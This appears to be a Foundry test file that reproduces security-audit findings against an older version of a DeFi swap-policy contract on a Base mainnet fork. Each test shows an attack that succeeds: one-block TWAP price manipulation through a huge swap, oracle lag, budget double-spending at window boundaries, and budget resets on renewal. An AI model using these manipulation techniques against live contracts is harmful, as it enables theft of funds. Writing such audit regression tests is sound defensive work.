// SPDX-License-Identifier: GPL-2.0-or-later
pragma solidity ^0.8.28;

import {Test, console2} from "forge-std/Test.sol";
import {TickMath} from "@uniswap/v3-core/contracts/libraries/TickMath.sol";
import {IUniswapV3Pool} from "@uniswap/v3-core/contracts/interfaces/IUniswapV3Pool.sol";
import {OracleLibrary} from "@uniswap/v3-periphery/contracts/libraries/OracleLibrary.sol";
import {
    MamoruActionPolicyT4,
    ConfigId,
    MintParams,
    ExactInputSingleParams,
    DecreaseLiquidityParams,
    IERC20Min
} from "./legacy/MamoruActionPolicyT4.sol";

interface IRouterB {
    function exactInputSingle(ExactInputSingleParams calldata) external payable returns (uint256);
}

interface INPMB {
    function mint(MintParams calldata) external payable returns (uint256, uint128, uint256, uint256);
}

/**
 * The T6 findings reproduced against the T4 contract (031be60, copied verbatim to test/legacy/): every test here
 * PASSES BY SHOWING THE WEAKNESS. T6Fixes.t.sol runs the same attacks against the fixed contract, where they fail.
 */
contract T6BeforeTest is Test {
    address constant SMART_SESSION = 0x00000000002B0eCfbD0496EE71e01257dA0E37DE;
    address constant NPM = 0x03a520b32C04BF3bEEf7BEb72E919cf822Ed34f1;
    address constant ROUTER = 0x2626664c2603336E57B271c5C0b26F421741e481;
    address constant FACTORY = 0x33128a8fC17869897dcE68Ed026d694621f6FDfD;
    address constant USDC = 0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913;
    address constant CBBTC = 0xcbB7C0000aB88B473b1f5aFd9ef808440eed33Bf;
    address constant USDT = 0xfde4C96c8593536E31F229EA8f37b2ADa2699bb2;
    address constant POOL_BTC = 0xfBB6Eed8e7aa03B138556eeDaF5D271A5E1e43ef;
    address constant POOL_STABLE = 0xD56da2B74bA826f19015E6B7Dd9Dae1903E85DA1;

    MamoruActionPolicyT4 policy;
    address safe = makeAddr("safe");
    address attacker = makeAddr("attacker");
    ConfigId constant ID = ConfigId.wrap(bytes32(uint256(1)));

    function setUp() public {
        vm.createSelectFork(vm.envOr("BASE_FORK_RPC_URL", string("https://mainnet.base.org")), 52_700_000);
        policy = new MamoruActionPolicyT4(SMART_SESSION, NPM, ROUTER, FACTORY);
    }

    function _init(ConfigId id, address pool, uint24 band, uint64 gen, uint128 w0, uint128 w1, uint128 t0, uint128 t1)
        internal
    {
        vm.prank(SMART_SESSION);
        policy.initializeWithMultiplexer(
            safe,
            id,
            abi.encode(
                MamoruActionPolicyT4.Init({
                    pool: pool,
                    twapWindow: 1800,
                    bandTicks: band,
                    generation: gen,
                    budgetWindow: 1 days,
                    perWindow0: w0,
                    perWindow1: w1,
                    total0: t0,
                    total1: t1
                })
            )
        );
    }

    function _check(ConfigId id, bytes memory data) internal returns (uint256 r) {
        vm.prank(SMART_SESSION);
        r = policy.checkAction(id, safe, ROUTER, 0, data);
    }

    function _swapAtTick(address tIn, address tOut, uint24 fee, uint256 amountIn, int24 tick)
        internal
        view
        returns (bytes memory)
    {
        uint256 q = OracleLibrary.getQuoteAtTick(tick, uint128(amountIn), tIn, tOut);
        return abi.encodeCall(
            IRouterB.exactInputSingle,
            (ExactInputSingleParams(
                    tIn, tOut, fee, safe, amountIn, (q * (1e6 - fee)) / 1e6, TickMath.getSqrtRatioAtTick(tick)
                ))
        );
    }

    function _spot(address pool) internal view returns (int24 t) {
        (, t,,,,,) = IUniswapV3Pool(pool).slot0();
    }

    function _twap(address pool, uint32 w) internal view returns (int24 t) {
        (t,) = OracleLibrary.consult(pool, w);
    }

    function _push(address tokenIn, address tokenOut, uint24 fee, int24 target) internal returns (uint256 got) {
        deal(tokenIn, attacker, 1e30);
        vm.startPrank(attacker);
        IERC20Min(tokenIn).approve(ROUTER, type(uint256).max);
        uint256 o0 = IERC20Min(tokenOut).balanceOf(attacker);
        IRouterB(ROUTER)
            .exactInputSingle(
                ExactInputSingleParams(tokenIn, tokenOut, fee, attacker, 1e29, 0, TickMath.getSqrtRatioAtTick(target))
            );
        got = IERC20Min(tokenOut).balanceOf(attacker) - o0;
        vm.stopPrank();
    }

    function _sell(address tokenIn, address tokenOut, uint24 fee, uint256 amountIn) internal {
        vm.startPrank(attacker);
        IERC20Min(tokenIn).approve(ROUTER, type(uint256).max);
        IRouterB(ROUTER)
            .exactInputSingle(
                ExactInputSingleParams(
                    tokenIn,
                    tokenOut,
                    fee,
                    attacker,
                    amountIn,
                    0,
                    tokenIn < tokenOut ? TickMath.MIN_SQRT_RATIO + 1 : TickMath.MAX_SQRT_RATIO - 1
                )
            );
        vm.stopPrank();
    }

    /// H-1: one block held 9,000 ticks away moves the stables TWAP by the band; T4 then accepts a swap 2 bands off.
    function test_before_H1_oneBlockOutlierAccepted() public {
        _init(ID, POOL_STABLE, 10, 1, 1e12, 1e12, 1e12, 1e12);
        int24 twap0 = _twap(POOL_STABLE, 1800);
        uint256 usdtOut = _push(USDC, USDT, 100, _spot(POOL_STABLE) - 9_000);
        vm.roll(block.number + 1);
        vm.warp(block.timestamp + 2);
        _sell(USDT, USDC, 100, usdtOut);
        int24 twap1 = _twap(POOL_STABLE, 1800);
        assertGe(twap0 - twap1, 10);
        assertEq(_check(ID, _swapAtTick(USDC, USDT, 100, 10_000e6, twap1 - 10)), 0, "T4 accepts the shifted bound");
    }

    /// M-1: in a 120-tick, 30-minute move T4's floor sits at twap30 - band, ~160 ticks under the market.
    function test_before_M1_lagAccepted() public {
        _init(ID, POOL_BTC, 100, 1, 1e12, 1e12, 1e12, 1e12);
        for (uint256 i; i < 30; i++) {
            vm.roll(block.number + 30);
            vm.warp(block.timestamp + 60);
            _push(CBBTC, USDC, 500, _spot(POOL_BTC) + 4);
        }
        vm.roll(block.number + 1);
        vm.warp(block.timestamp + 2);
        int24 tl = _twap(POOL_BTC, 1800);
        console2.log("T4 floor under the market (ticks):", uint256(int256(_spot(POOL_BTC) - (tl - 100))));
        assertEq(_check(ID, _swapAtTick(USDC, CBBTC, 500, 10_000e6, tl - 100)), 0, "T4 accepts the lagging floor");
    }

    /// M-2: a 100k budget per token lets a round trip cross ~2 x 100k.
    function test_before_M2_roundTripCrossesTwice() public {
        uint256 btc100k = OracleLibrary.getQuoteAtTick(_twap(POOL_BTC, 1800), 100_000e6, USDC, CBBTC);
        _init(ID, POOL_BTC, 100, 1, 100_000e6, uint128(btc100k), 100_000e6, uint128(btc100k));
        int24 t = _twap(POOL_BTC, 1800);
        assertEq(_check(ID, _swapAtTick(USDC, CBBTC, 500, 100_000e6, t - 100)), 0);
        assertEq(_check(ID, _swapAtTick(CBBTC, USDC, 500, btc100k, t + 100)), 0, "second 100k leg also passes");
    }

    /// M-3: the per-window budget twice in two seconds across a UTC day boundary.
    function test_before_M3_doubleWindowAtTheBoundary() public {
        _init(ID, POOL_BTC, 100, 1, 60_000e6, 1e12, 1_000_000e6, 1e12);
        uint256 boundary = ((block.timestamp / 1 days) + 1) * 1 days;
        vm.warp(boundary - 2);
        assertEq(_check(ID, _swapAtTick(USDC, CBBTC, 500, 60_000e6, _twap(POOL_BTC, 1800) - 100)), 0);
        vm.warp(boundary);
        vm.roll(block.number + 1);
        assertEq(_check(ID, _swapAtTick(USDC, CBBTC, 500, 60_000e6, _twap(POOL_BTC, 1800) - 100)), 0, "2W in 2 s");
    }

    /// L-5: a renewal hands the per-window budget out again at once.
    function test_before_L5_renewalResetsTheWindow() public {
        _init(ID, POOL_BTC, 100, 1, 60_000e6, 1e12, 1_000_000e6, 1e12);
        assertEq(_check(ID, _swapAtTick(USDC, CBBTC, 500, 60_000e6, _twap(POOL_BTC, 1800) - 100)), 0);
        ConfigId fresh = ConfigId.wrap(bytes32(uint256(2)));
        _init(fresh, POOL_BTC, 100, 2, 60_000e6, 1e12, 1_000_000e6, 1e12);
        assertEq(_check(fresh, _swapAtTick(USDC, CBBTC, 500, 60_000e6, _twap(POOL_BTC, 1800) - 100)), 0);
    }

    /// M-4: a position the Safe holds from a v2/v3 grant can never be decreased by a v4 session.
    function test_before_M4_existingPositionStuck() public {
        _init(ID, POOL_BTC, 100, 1, 1e12, 1e12, 1e12, 1e12);
        int24 s = _spot(POOL_BTC);
        deal(USDC, safe, 20_000e6);
        deal(CBBTC, safe, 0.2e8);
        vm.startPrank(safe);
        IERC20Min(USDC).approve(NPM, 20_000e6);
        IERC20Min(CBBTC).approve(NPM, 0.2e8);
        (uint256 id, uint128 liq,,) = INPMB(NPM)
            .mint(
                MintParams(
                    USDC,
                    CBBTC,
                    500,
                    ((s - 600) / 10) * 10,
                    ((s + 600) / 10) * 10,
                    20_000e6,
                    0.2e8,
                    0,
                    0,
                    safe,
                    block.timestamp
                )
            );
        vm.stopPrank();
        bytes memory dec = abi.encodeWithSelector(0x0c49ccbe, DecreaseLiquidityParams(id, liq, 1, 1, block.timestamp));
        vm.prank(SMART_SESSION);
        assertEq(policy.checkAction(ID, safe, NPM, 0, dec), 1, "no way to admit it");
    }
}
